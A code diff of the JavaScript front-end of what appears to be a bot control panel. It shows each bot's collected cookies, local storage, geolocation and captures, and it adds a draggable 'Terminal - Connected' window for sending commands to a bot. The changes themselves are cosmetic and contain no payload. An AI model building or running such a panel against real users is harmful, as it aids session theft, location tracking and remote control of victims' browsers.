@@ -15,10 +15,10 @@ function update() {
     fetch('/output/' + botname)
     .then(response => response.json())
     .then(data => {
-        cookiesSection.innerHTML = '<h2>Cookies</h2>';
-        localStorageSection.innerHTML = '<h2>Local Storage</h2>';
-        geolocSection.innerHTML = '<h2>Geolocation</h2>';
-        captureSection.innerHTML = '<h2>Captures</h2>';
+        cookiesSection.innerHTML = '<h2>Cookies:</h2>';
+        localStorageSection.innerHTML = '<h2>Local Storage:</h2>';
+        geolocSection.innerHTML = '<h2>Geolocation:</h2>';
+        captureSection.innerHTML = '<h2>Captures:</h2>';
         data.forEach(item => {
         if (item.cookies) {
             const cookiesList = document.createElement("ul");
@@ -28,7 +28,6 @@ function update() {
             cookiesList.appendChild(cookieItem);
             });
             if (cookiesList.children.length > 0) {
-            cookiesSection.innerHTML = '';
             cookiesSection.appendChild(cookiesList);
             } else {
             cookiesSection.innerHTML = 'No data found for cookies';
@@ -42,7 +41,6 @@ function update() {
             localStorageList.appendChild(storageItem);
             });
             if (localStorageList.children.length > 0) {
-            localStorageSection.innerHTML = '';
             localStorageSection.appendChild(localStorageList);
             } else {
             localStorageSection.innerHTML = 'No data found for local storage';
@@ -67,85 +65,122 @@ function update() {
 }
 
 function showTerminal() {
-    // Create terminal container
-    const terminal = document.createElement("div");
-    terminal.classList.add("terminal");
-  
-    // Create header
-    const header = document.createElement("div");
-    header.classList.add("header");
-  
-    // Create title
-    const title = document.createElement("div");
-    title.classList.add("title");
-    title.textContent = "Terminal - Connected";
-  
-    // Create close button
-    const closeButton = document.createElement("div");
-    closeButton.classList.add("close-button");
-    closeButton.innerHTML = "&#x2715;";
-    closeButton.addEventListener("click", () => {
-      document.body.removeChild(terminal);
-    });
-  
-    // Append title and close button to header
-    header.appendChild(title);
-    header.appendChild(closeButton);
-  
-    // Create output area
-    const outputArea = document.createElement("div");
-    outputArea.classList.add("output-area");
-  
-    // Create command input container
-    const inputContainer = document.createElement("div");
-    inputContainer.classList.add("input-container");
-  
-    // Create prompt
-    const prompt = document.createElement("div");
-    prompt.classList.add("prompt");
-    prompt.textContent = botname.split("-")[0] + "-#>";
-  
-    // Create command input
-    const commandInput = document.createElement("input");
-    commandInput.classList.add("command-input");
-    commandInput.setAttribute("type", "text");
-    commandInput.setAttribute("spellcheck", false);
-  
-    // Append elements to input container
-    inputContainer.appendChild(prompt);
-    inputContainer.appendChild(commandInput);
-  
-    // Append elements to terminal
-    terminal.appendChild(header);
-    terminal.appendChild(outputArea);
-    terminal.appendChild(inputContainer);
-  
-    // Append terminal to document body
-    document.body.appendChild(terminal);
-  
-    // Set focus on the command input element
-    commandInput.focus();
-  
-    // Add event listener to command input
-    commandInput.addEventListener("keydown", (event) => {
-      if (event.key === "Enter") {
-        event.preventDefault();
-        const command = commandInput.value.trim();
-        commandInput.value = "";
-        if (command.length > 2) {
-          if (command == "clear" ) {
-            outputArea.innerHTML = '';
-          } else {
-            const output = poser(command);
-            const outputElement = document.createElement("div");
-            outputElement.classList.add("output");
-            outputElement.innerHTML = output;
-            outputArea.appendChild(outputElement);
-          }
+  // Create terminal container
+  const terminal = document.createElement("div");
+  terminal.classList.add("terminal");
+
+  // Create header
+  const header = document.createElement("div");
+  header.classList.add("header");
+
+  // Create title
+  const title = document.createElement("div");
+  title.classList.add("title");
+  title.textContent = "Terminal - Connected";
+
+  // Create close button
+  const closeButton = document.createElement("div");
+  closeButton.classList.add("close-button");
+  closeButton.innerHTML = "&#x2715;";
+  closeButton.addEventListener("click", () => {
+    document.body.removeChild(terminal);
+  });
+
+  // Append title and close button to header
+  header.appendChild(title);
+  header.appendChild(closeButton);
+
+  // Create output area
+  const outputArea = document.createElement("div");
+  outputArea.classList.add("output-area");
+
+  // Create command input container
+  const inputContainer = document.createElement("div");
+  inputContainer.classList.add("input-container");
+
+  // Create prompt
+  const prompt = document.createElement("div");
+  prompt.classList.add("prompt");
+  prompt.textContent = botname.split("-")[0] + "-#>";
+
+  // Create command input
+  const commandInput = document.createElement("input");
+  commandInput.classList.add("command-input");
+  commandInput.setAttribute("type", "text");
+
+  // Append elements to input container
+  inputContainer.appendChild(prompt);
+  inputContainer.appendChild(commandInput);
+
+  // Append elements to terminal
+  terminal.appendChild(header);
+  terminal.appendChild(outputArea);
+  terminal.appendChild(inputContainer);
+
+  // Append terminal to document body
+  document.body.appendChild(terminal);
+
+  // Set focus on the command input element
+  commandInput.focus();
+
+  let isDragging = false;
+  let dragX, dragY;
+  let positionX, positionY;
+
+  // Add event listener to header for dragging the terminal
+  header.addEventListener("mousedown", startDragging);
+  header.addEventListener("mouseup", stopDragging);
+  header.addEventListener("mousemove", drag);
+
+  function startDragging(event) {
+    isDragging = true;
+
+    // Get initial position and coordinates of the mouse pointer
+    positionX = terminal.offsetLeft;
+    positionY = terminal.offsetTop;
+    dragX = event.clientX;
+    dragY = event.clientY;
+  }
+
+  function stopDragging() {
+    isDragging = false;
+  }
+
+  function drag(event) {
+    if (isDragging) {
+      // Calculate the new position of the terminal
+      const offsetX = event.clientX - dragX;
+      const offsetY = event.clientY - dragY;
+      const newPositionX = positionX + offsetX;
+      const newPositionY = positionY + offsetY;
+
+      // Set the new position of the terminal
+      terminal.style.left = newPositionX + "px";
+      terminal.style.top = newPositionY + "px";
+    }
+  }
+
+  // Add event listener to command input
+  commandInput.addEventListener("keydown", (event) => {
+    if (event.key === "Enter") {
+      event.preventDefault();
+      const command = commandInput.value.trim();
+      commandInput.value = "";
+      if (command.length > 2) {
+        if (command == "clear") {
+          outputArea.innerHTML = "";
+        } else {
+          const output = poser(command);
+          const outputElement = document.createElement("div");
+          outputElement.classList.add("output");
+          outputElement.innerHTML = output;
+          outputArea.appendChild(outputElement);
         }
       }
-    });
+    }
+  });
 }
+
   
 
 function poser(command) {
